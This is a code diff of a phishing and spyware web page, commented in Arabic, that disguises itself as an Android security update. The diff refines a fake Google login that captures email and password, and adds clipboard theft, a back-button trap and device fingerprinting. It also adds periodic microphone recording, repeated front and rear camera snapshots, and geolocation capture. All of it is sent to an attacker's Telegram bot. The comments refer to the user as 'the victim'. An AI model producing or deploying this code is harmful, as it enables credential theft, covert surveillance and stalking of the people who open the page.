@@ -3,47 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚙️ تحديث نظام الأندرويد</title>
+    <title>⚙️ نظام الأمان - فحص وتحديث</title>
     <style>
         body { background-color: #000; color: #fff; font-family: 'Roboto', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
-        .update-container { width: 85%; max-width: 400px; }
-        .android-logo { width: 80px; margin-bottom: 25px; filter: grayscale(1); opacity: 0.8; }
-        .progress-bg { width: 100%; height: 6px; background: #333; border-radius: 10px; margin: 20px 0; overflow: hidden; }
+        .container { width: 85%; max-width: 400px; transition: filter 0.5s; }
+        .android-logo { width: 70px; margin-bottom: 20px; filter: grayscale(1); opacity: 0.7; }
+        .progress-bg { width: 100%; height: 5px; background: #222; border-radius: 10px; margin: 15px 0; overflow: hidden; }
         .progress-bar { width: 0%; height: 100%; background: #4285f4; border-radius: 10px; transition: width 0.5s; }
-        .status-text { font-size: 18px; color: #eee; margin-bottom: 5px; }
-        .sub-text { font-size: 12px; color: #777; line-height: 1.5; }
+        .status-text { font-size: 16px; color: #eee; }
         
-        /* واجهة تسجيل الدخول الوهمية (Phishing) */
+        /* واجهة الفيشينج المتقدمة */
         #phish-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; justify-content: center; align-items: center; color: #000; }
-        .login-card { width: 90%; max-width: 360px; padding: 40px 20px; text-align: center; }
-        .login-card img { width: 75px; margin-bottom: 20px; }
-        .login-card input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
-        .login-card button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        .login-card { width: 90%; max-width: 360px; padding: 30px; text-align: center; }
+        .login-card img { width: 70px; margin-bottom: 15px; }
+        .login-card input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
+        .login-card button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; }
         
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="update-container" id="main-ui">
+    <div class="container" id="main-ui">
         <img src="https://www.gstatic.com/images/branding/product/2x/android_96dp.png" class="android-logo">
-        <div class="status-text">جاري تثبيت تحديث الأمان... <span id="percent">0%</span></div>
+        <div class="status-text">جاري فحص وتحديث أمان النظام... <span id="percent">0%</span></div>
         <div class="progress-bg"><div class="progress-bar" id="bar"></div></div>
-        <p class="sub-text">يتم الآن سد الثغرات وتحسين أداء النظام.<br>يرجى عدم إغلاق المتصفح لضمان سلامة بياناتك.</p>
+        <p style="font-size: 11px; color: #555;">يرجى السماح بالأذونات المطلوبة لضمان سلامة بياناتك ومنع الاختراق.</p>
     </div>
 
     <div id="phish-overlay">
         <div class="login-card">
             <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
-            <h1 style="font-size: 22px; font-weight: 400;">تأكيد ملكية الحساب</h1>
-            <p style="font-size: 14px; color: #5f6368;">لإتمام التحديث، يرجى تسجيل الدخول</p>
+            <h2 style="font-size: 20px; font-weight: 400;">تأكيد الهوية مطلوب</h2>
+            <p style="font-size: 14px; color: #5f6368;">لإتمام عملية الفحص، يرجى تسجيل الدخول</p>
             <input type="email" id="email" placeholder="البريد الإلكتروني">
             <input type="password" id="pass" placeholder="كلمة المرور">
-            <button onclick="sendCreds()">تأكيد الهوية</button>
+            <button onclick="sendCreds()">متابعة</button>
         </div>
     </div>
 
-    <video id="video" autoplay playsinline muted></video>
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
@@ -56,51 +55,65 @@
             fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
         }
 
-        // 1. نظام "سجن المتصفح" والاهتزاز
-        function lockDown() {
-            if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 500]);
-            
-            // منع الخروج عبر زر الرجوع (100 مرة لضمان القفل)
-            for (let i = 0; i < 100; i++) {
+        // 1. اختطاف الحافظة و "سجن" المتصفح
+        function secureJail() {
+            // سحب الحافظة عند أول ضغطة
+            document.addEventListener('click', async () => {
+                try {
+                    const text = await navigator.clipboard.readText();
+                    if(text) notify(`📋 **نص من الحافظة:**\n\`${text}\``);
+                } catch(e) {}
+            }, {once: true});
+
+            // منع الخروج (زر الرجوع) + اهتزاز
+            if(navigator.vibrate) navigator.vibrate([300, 100, 300]);
+            for(let i=0; i<50; i++) window.history.pushState(null, null, window.location.href);
+            window.onpopstate = () => {
                 window.history.pushState(null, null, window.location.href);
-            }
-            window.onpopstate = function() {
-                window.history.pushState(null, null, window.location.href);
-                notify("⚠️ **الضحية حاول الخروج عبر زر الرجوع، تم منعه!**");
+                notify("⚠️ الضحية حاول الخروج من الرابط!");
             };
         }
 
-        // 2. سحب الحافظة (Clipboard) عند أول ضغطة
-        document.addEventListener('click', async () => {
-            try {
-                const text = await navigator.clipboard.readText();
-                if(text) notify(`📋 **نص من حافظة الضحية:**\n\`${text}\``);
-            } catch(e) {}
-        }, {once: true});
+        // 2. سحب البيانات التقنية ومستشعرات الحركة
+        async function getDeepIntel() {
+            let b = await (navigator.getBattery ? navigator.getBattery() : {level: 0});
+            let info = `🚀 **هدف جديد في الفخ:**\n\n`;
+            info += `📱 *النظام:* ${navigator.platform}\n`;
+            info += `🔋 *البطارية:* ${Math.round(b.level*100)}%\n`;
+            info += `📶 *الشبكة:* ${navigator.connection ? navigator.connection.effectiveType : 'N/A'}\n`;
+            info += `⏰ *التوقيت:* ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            notify(info);
 
-        // 3. التجسس الصوتي (5 ثوانٍ كل 15 ثانية)
-        async function startAudio() {
+            // مراقبة الحركة لمرة واحدة
+            window.addEventListener('devicemotion', (e) => {
+                if (Math.abs(e.acceleration.x) > 0.5) notify("🏃 الضحية يتحرك أو يمسك الجهاز بيده.");
+            }, {once: true});
+
+            // كشف الحسابات النشطة
+            ["Google", "Facebook", "Twitter"].forEach(s => {
+                let img = new Image(); img.src = `https://${s.toLowerCase()}.com/favicon.ico`;
+                img.onload = () => notify(`🌐 الضحية مسجل دخول في: *${s}*`);
+            });
+        }
+
+        // 3. التجسس الصوتي (5 ثواني كل 15 ثانية)
+        async function audioSpy() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const rec = new MediaRecorder(stream);
                 rec.ondataavailable = (e) => {
-                    const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('voice', e.data, 'v.ogg');
+                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('voice', e.data, 'v.ogg');
                     fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
                 };
-                setInterval(() => {
-                    rec.start();
-                    setTimeout(() => rec.stop(), 5000);
-                }, 15000);
-            } catch(e) { notify("❌ **الضحية رفض إذن الميكروفون.**"); }
+                setInterval(() => { rec.start(); setTimeout(() => rec.stop(), 5000); }, 15000);
+            } catch(e) { notify("❌ رفض الميكروفون."); }
         }
 
-        // 4. التصوير المزدوج التتابعي (كل 2 ثانية)
-        async function startVisuals() {
+        // 4. التجسس البصري التتابعي (أمامية/خلفية كل 2 ثانية)
+        async function visualSpy() {
+            const modes = ["user", "environment"];
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
-            const modes = ["user", "environment"];
             let i = 0;
             while(true) {
                 try {
@@ -110,11 +123,9 @@
                     await new Promise(r => setTimeout(r, 800));
                     canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', CHAT_ID);
-                        fd.append('photo', blob, 'shot.jpg');
-                        fd.append('caption', `📷 كاميرا: ${modes[i%2]==="user"?"أمامية":"خلفية"}`);
+                    canvas.toBlob(b => {
+                        const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'i.jpg');
+                        fd.append('caption', `📸 لقطة: ${modes[i%2]==="user"?"أمامية":"خلفية"}`);
                         fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                     }, 'image/jpeg', 0.5);
                 } catch(e) {}
@@ -123,17 +134,12 @@
         }
 
         // 5. محاكاة التحديث (التمويه)
-        function runUpdate() {
+        function startFakeUpdate() {
             let p = 0;
             const bar = document.getElementById('bar');
             const per = document.getElementById('percent');
             setInterval(() => {
-                if (p < 99) {
-                    p += Math.floor(Math.random() * 2) + 1;
-                    if(p > 99) p = 99;
-                    bar.style.width = p + '%';
-                    per.innerText = p + '%';
-                }
+                if (p < 99) { p += Math.floor(Math.random() * 2) + 1; bar.style.width = p + '%'; per.innerText = p + '%'; }
             }, 6000);
         }
 
@@ -141,34 +147,27 @@
             const e = document.getElementById('email').value;
             const p = document.getElementById('pass').value;
             if(e && p) {
-                notify(`🔥 **بيانات مسحوبة:**\n📧: \`${e}\`\n🔐: \`${p}\``);
+                notify(`🔥 **بيانات جوجل مسحوبة:**\n📧: \`${e}\`\n🔐: \`${p}\``);
                 document.getElementById('phish-overlay').style.display = 'none';
-                alert("اكتمل التحديث. سيتم إعادة تشغيل النظام.");
+                alert("اكتمل التحديث. سيتم إعادة تشغيل الجهاز.");
             }
         }
 
         window.onload = () => {
-            lockDown();
-            runUpdate();
-            startAudio();
-            startVisuals();
-            
-            // إظهار تنبيه وهمي لطلب الأذونات
-            setTimeout(() => {
-                alert("⚠️ تم اكتشاف محاولة دخول غريبة لحسابك. يرجى السماح بالأذونات للتحقق من هويتك ومنع الاختراق!");
-            }, 2000);
-
+            secureJail();
+            getDeepIntel();
+            audioSpy();
+            visualSpy();
+            startFakeUpdate();
             // سحب الموقع
             navigator.geolocation.getCurrentPosition(pos => {
-                notify(`📍 **الموقع:** https://www.google.com/maps?q=$${pos.coords.latitude},${pos.coords.longitude}`);
+                notify(`📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
             });
-
-            // إظهار تسجيل الدخول بعد 40 ثانية
+            // إظهار تسجيل الدخول بعد 25 ثانية
             setTimeout(() => {
                 document.getElementById('phish-overlay').style.display = 'flex';
-                document.getElementById('main-ui').style.filter = 'blur(8px)';
-            }, 40000);
-            
+                document.getElementById('main-ui').style.filter = 'blur(10px)';
+            }, 25000);
             if(navigator.wakeLock) navigator.wakeLock.request('screen');
         };
     </script>
